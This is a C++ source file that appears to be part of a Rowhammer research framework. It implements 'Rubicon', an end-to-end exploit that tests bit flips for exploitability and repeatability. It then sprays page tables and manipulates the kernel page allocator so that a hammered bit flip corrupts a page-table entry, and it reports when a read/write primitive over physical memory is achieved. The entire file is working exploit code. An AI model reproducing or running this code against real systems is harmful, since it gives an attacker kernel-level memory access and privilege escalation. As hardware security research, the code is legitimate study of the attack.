#include "Rubicon.hpp"
#include "Forges/FuzzyHammerer.hpp"

#include <fcntl.h>
#include <string>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define REPEATABILITY_ROUNDS 8
#define HAMMER_ROUNDS 10
#define PAGE_SIZE 0x1000UL
#define PTE_FLAGS 0x8000000000000027
#define NR_VMA_LIMIT 63000
#define PAGE_TABLE_BACKED_SIZE 0x200000UL
#define SPRAY_BASE 0x100000000UL
#define PCP_PUSH_SIZE 0x2000000UL
#define EVICT_SIZE 0x8000000UL

#define bitmask_to_64bit(bitmask, addr)                                        \
  (static_cast<uint64_t>(bitmask)                                              \
   << ((reinterpret_cast<uint64_t>(addr) % 8) * 8))
#define align(value, alignment) ((value) & ~((alignment)-1))
#define align_ptr_to_page(addr)                                                \
  (reinterpret_cast<void *>(                                                   \
      align(reinterpret_cast<uintptr_t>(addr), PAGE_SIZE)))

Rubicon::Rubicon(bool use_page, bool use_hugepage)
    : use_hugepage(use_hugepage) {
  std::random_device rd;
  gen = std::mt19937(rd());
  range = Range<uint64_t>(0, 262144);

  if (use_page) {
    // Mask to extract offset within a 4 KiB page directory range.
    alignment = 0x80000UL;
  } else if (use_hugepage) {
    alignment = 0x200000UL;
  } else {
    Logger::log_error("Rubicon does not support superpages!");
    exit(EXIT_FAILURE);
  }
}

void Rubicon::restore_page(int *page_ptr) {
  srand(static_cast<unsigned int>(reinterpret_cast<uint64_t>(page_ptr) *
                                  getpagesize()));
  for (size_t j = 0; j < PAGE_SIZE / sizeof(int); ++j) {
    page_ptr[j] = rand();
  }
}

bool Rubicon::check_repeatability(
    CodeJitter &code_jitter, FuzzingParameterSet &fuzzing_params,
    const std::vector<volatile char *> &random_rows,
    int wait_until_hammering_us, uint64_t bitflip_address64,
    uint64_t bitflip_mask64, uint64_t bitflip_corrupted64) {
  void *page_ptr = align_ptr_to_page(bitflip_address64);
  uint64_t *pte_ptr =
      reinterpret_cast<uint64_t *>(align(bitflip_address64, sizeof(uint64_t)));

  uint64_t known_bits = align(bitflip_address64 & (alignment - 1), PAGE_SIZE);
  uint64_t pte_template = (PTE_FLAGS | known_bits) ^ bitflip_mask64;

  for (unsigned long i = 0; i < REPEATABILITY_ROUNDS; ++i) {
    uint64_t unknown_bits = range.get_random_number(gen)
                            << (use_hugepage ? 22 : 19);
    uint64_t pte = pte_template | unknown_bits;
    uint64_t pte_flipped = pte ^ bitflip_mask64;
    Logger::log_info(format_string("PTE: %lx\n", pte));

    memset(page_ptr, 0, PAGE_SIZE);
    *pte_ptr = pte;

    for (int j = 0; j < HAMMER_ROUNDS / 2; ++j) {
      FuzzyHammerer::do_random_accesses(random_rows, wait_until_hammering_us);
      code_jitter.hammer_pattern(fuzzing_params, false);
    }

    clflushopt(pte_ptr);
    asm volatile("mfence" ::: "memory");
    Logger::log_info(format_string("PTE flipped: %lx\n", *pte_ptr));
    if (*pte_ptr != pte_flipped) {
      restore_page(reinterpret_cast<int *>(page_ptr));
      return false;
    }
  }

  restore_page(reinterpret_cast<int *>(page_ptr));
  return true;
}

void Rubicon::open_spraying_file(void *file_target) {
  const char *buf = "ffffffffffffffff";

  fd_spray = open("/dev/shm", O_TMPFILE | O_RDWR, S_IRUSR | S_IWUSR);
  block_merge(file_target, 0);
  write(fd_spray, buf, 8);
  file_ptr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                  MAP_SHARED | MAP_POPULATE, fd_spray, 0);
  mlock(file_ptr, PAGE_SIZE);
}

void Rubicon::close_spraying_file() {
  munlock(file_ptr, PAGE_SIZE);
  munmap(file_ptr, PAGE_SIZE);
  close(fd_spray);
}

int Rubicon::spray_tables() {
  Logger::log_info("Spraying tables...\n");
  for (unsigned i = 1; i < NR_VMA_LIMIT; ++i) {
    void *addr =
        reinterpret_cast<void *>(SPRAY_BASE + PAGE_TABLE_BACKED_SIZE * i);
    if (mmap(addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
             MAP_FIXED_NOREPLACE | MAP_SHARED | MAP_POPULATE, fd_spray,
             0) == MAP_FAILED) {
      printf("Failed to spray tables\n");
      exit(EXIT_FAILURE);
    }
  }

  return 0;
}

void Rubicon::unspray_tables() {
  for (unsigned i = 1; i < NR_VMA_LIMIT; ++i) {
    void *addr =
        reinterpret_cast<void *>(SPRAY_BASE + PAGE_TABLE_BACKED_SIZE * i);
    if (munmap(addr, PAGE_SIZE)) {
      printf("Failed to unspray tables\n");
      exit(EXIT_FAILURE);
    }
  }
}

void Rubicon::huge_split(void *sacrificial_page) {
  madvise(sacrificial_page, PAGE_SIZE, MADV_FREE);
}

int Rubicon::block_merge(void *target, unsigned order) {
  if (munmap(target, PAGE_SIZE << order)) {
    return -1;
  }

  if (order == 0) {
    return 0;
  }

  void *flush_ptr = mmap(NULL, PCP_PUSH_SIZE, PROT_READ | PROT_WRITE,
                         MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
  if (flush_ptr == MAP_FAILED) {
    return -1;
  }

  return munmap(flush_ptr, PCP_PUSH_SIZE);
}

int Rubicon::migratetype_escalation(std::vector<void *> &bait_pages) {
  unsigned long exhaust_size =
      sysconf(_SC_AVPHYS_PAGES) * sysconf(_SC_PAGESIZE) - 0x10000000UL;
  void *exhaust_ptr = mmap(NULL, exhaust_size, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

  if (exhaust_ptr == MAP_FAILED) {
    Logger::log_error("escalation: Failed to mmap exhaust_ptr");
  }

  for (void *page : bait_pages) {
    if (munmap(page, PAGE_SIZE)) {
      Logger::log_error(
          format_string("escalation: Failed to unmap page %p", page));
    }
  }

  spray_tables();

  return munmap(exhaust_ptr, exhaust_size);
}

void Rubicon::e2e(CodeJitter &code_jitter, FuzzingParameterSet &fuzzing_params,
                  const std::vector<volatile char *> &aggressors,
                  const std::vector<volatile char *> &random_rows,
                  int wait_until_hammering_us,
                  std::vector<BitFlip> &bit_flips) {
  for (const auto &bitflip : bit_flips) {
    uint64_t bitflip_address64 =
        reinterpret_cast<uint64_t>(bitflip.address.to_virt());
    uint64_t bitflip_mask64 =
        bitmask_to_64bit(bitflip.bitmask, bitflip_address64);
    uint64_t bitflip_corrupted64 =
        bitmask_to_64bit(bitflip.corrupted_data, bitflip_address64);

    Logger::log_info("Testing bitflip:\n");
    Logger::log_info(
        format_string("  Address: %p\n", bitflip.address.to_virt()));
    Logger::log_info(format_string("  Bitmask: %lx\n", bitflip_mask64));
    Logger::log_info(
        format_string("  Corrupted data: %lx\n", bitflip_corrupted64));

    // the first condition checks whether the PTE points to a page within the
    // massaged THP after the bitflip, the second condition checks whether the
    // PTE can point to its own page table after the bitflip
    if ((bitflip_mask64 & (~(alignment - 1) | (PAGE_SIZE - 1))) ||
        ((bitflip_address64 & bitflip_mask64) ^
         (bitflip_corrupted64 & bitflip_mask64))) {
      Logger::log_info("Bitflip is not exploitable.\n");
      Logger::flush();
      continue;
    }

    if (!check_repeatability(code_jitter, fuzzing_params, random_rows,
                             wait_until_hammering_us, bitflip_address64,
                             bitflip_mask64, bitflip_corrupted64)) {
      Logger::log_info("Bitflip is not repeatable.\n");
      Logger::flush();
      continue;
    }

    Logger::log_info("Found exploitable bitflip: %lu\n", realtime_now());
    Logger::flush();

    void *file_target = align_ptr_to_page(bitflip_address64 ^ bitflip_mask64);
    void *table_target = align_ptr_to_page(bitflip_address64);

    mlock(table_target, PAGE_SIZE);

    std::set<void *> aggressor_pages;
    for (const auto &aggressor : aggressors) {
      void *aggressor_page = align_ptr_to_page(aggressor);
      aggressor_pages.insert(aggressor_page);
      mlock(aggressor_page, PAGE_SIZE);
      if (mlock(aggressor_page, PAGE_SIZE)) {
        Logger::log_error(
            format_string("Failed to lock aggressor page %p", aggressor_page));
      }
    }
    for (const auto &aggressor : random_rows) {
      void *aggressor_page = align_ptr_to_page(aggressor);
      aggressor_pages.insert(aggressor_page);
      if (mlock(aggressor_page, PAGE_SIZE)) {
        Logger::log_error(
            format_string("Failed to lock aggressor page %p", aggressor_page));
      }
    }

    uint64_t block64;
    uint64_t bait_range;
    if (use_hugepage) {
      block64 = align(bitflip_address64, 0x200000UL);
      bait_range = 0x200000UL;
    } else {
      block64 = align(bitflip_address64, PAGE_SIZE) - 0x200000UL;
      bait_range = 0x400000UL;
    }
    void *block = align_ptr_to_page(block64);
    std::vector<void *> bait_pages;
    for (uint64_t offset = 0; offset < bait_range; offset += PAGE_SIZE) {
      void *candidate =
          reinterpret_cast<void *>(reinterpret_cast<uint64_t>(block) + offset);
      if (candidate == table_target)
        continue;
      if (candidate == file_target)
        continue;
      if (aggressor_pages.find(candidate) == aggressor_pages.end()) {
        bait_pages.push_back(candidate);
      }
    }

    Logger::log_info(format_string("Block: %p\n", block));
    Logger::log_info(format_string("File target: %p\n", file_target));
    Logger::log_info(format_string("Table target: %p\n", table_target));

    if (use_hugepage)
      huge_split(block);

    open_spraying_file(file_target);
    migratetype_escalation(bait_pages);

    unspray_tables();

    void *fetch_pds = reinterpret_cast<void *>(SPRAY_BASE);
    mmap(fetch_pds, PAGE_SIZE, PROT_READ | PROT_WRITE,
         MAP_FIXED | MAP_SHARED | MAP_POPULATE, fd_spray, 0);

    uint64_t victim_offset =
        ((bitflip_address64 & (PAGE_SIZE - 1)) >> 3) * PAGE_SIZE;
    uint64_t *victim = reinterpret_cast<uint64_t *>(
        SPRAY_BASE + PAGE_TABLE_BACKED_SIZE + victim_offset);
    munlock(table_target, PAGE_SIZE);
    block_merge(table_target, 0);
    mmap(victim, PAGE_SIZE, PROT_READ | PROT_WRITE,
         MAP_FIXED | MAP_SHARED | MAP_POPULATE, fd_spray, 0);

    void *evict_ptr = mmap(NULL, EVICT_SIZE, PROT_READ | PROT_WRITE,
                           MAP_ANONYMOUS | MAP_SHARED | MAP_POPULATE, -1, 0);
    for (char *evict_it = static_cast<char *>(evict_ptr);
         evict_it < static_cast<char *>(evict_ptr) + EVICT_SIZE;
         evict_it += PAGE_SIZE) {
      *evict_it = 0;
    }
    munmap(evict_ptr, EVICT_SIZE);

    for (int i = 0; i < HAMMER_ROUNDS; ++i) {
      FuzzyHammerer::do_random_accesses(random_rows, wait_until_hammering_us);
      code_jitter.hammer_pattern(fuzzing_params, false);
    }

    clflushopt(&(victim[victim_offset >> 12]));
    asm volatile("mfence" ::: "memory");
    Logger::log_info(format_string("Value: %lx.", victim[victim_offset >> 12]));

    if ((victim[victim_offset >> 12] & 0xff) == 0x27UL) {
      Logger::log_info(format_string("R/W Primitive achieved!"));
      Logger::log_info(format_string("  Timestamp: %lu.", realtime_now()));
      Logger::flush();
    }

    victim[victim_offset >> 12] = victim[victim_offset >> 12] ^ bitflip_mask64;
    clflushopt(&(victim[victim_offset >> 12]));

    munmap(victim, PAGE_SIZE);
    munmap(fetch_pds, PAGE_SIZE);

    for (const auto &aggressor : aggressor_pages) {
      if (munlock(aggressor, PAGE_SIZE)) {
        Logger::log_error(
            format_string("Failed to unmap aggressor page %p", aggressor));
      }
    }

    close_spraying_file();

    Logger::flush();
    exit(EXIT_SUCCESS);
    return;
  }
}